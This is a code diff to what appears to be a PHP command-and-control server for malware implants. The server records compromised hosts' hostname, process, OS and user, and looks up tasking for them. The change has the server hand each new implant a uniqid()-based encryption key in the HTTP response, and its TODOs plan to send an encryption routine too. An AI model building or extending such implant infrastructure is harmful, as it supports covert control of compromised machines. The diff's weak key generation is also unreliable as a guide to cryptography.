@@ -37,16 +37,26 @@
 
     # If new host
     if ($row_count == "0") {
+        # Generates unique encryption key for the new implant
+        $encryption_key = uniqid();
+
         # Inserts entry into "implants" table
-        # uniqid() is used to create a unique encryption key for the new implant
         $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`, `encryption_key`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen, :encryption_key)");
         $statement->bindValue(":hostname", $hostname);
         $statement->bindValue(":process_id", $process_id);
         $statement->bindValue(":os", $os);
         $statement->bindValue(":current_user", $current_user);
         $statement->bindValue(":last_seen", $current_time);
-        $statement->bindValue(":encryption_key", uniqid());
+        $statement->bindValue(":encryption_key", $encryption_key);
         $statement->execute();
+
+        # Echoes out encryption key and routine in the HTTP response
+        # This is the only time this encryption key is exchanged
+
+
+        # TO DO: This will echo out the encryption key, but I need to also echo out the encryption function/routine (definition)
+        echo "k = '" . $encryption_key . "'";
+
     }
     # Else old host
     else {
@@ -64,6 +74,9 @@
         $statement->execute();
         $results = $statement->fetch();
         $row_count = $statement->rowCount();
+
+        # TO DO: This is just to show that the encryption key is now stored in memory on the implanted system
+        echo "print k";
 
         # If tasking found
         if ($row_count > "0") {
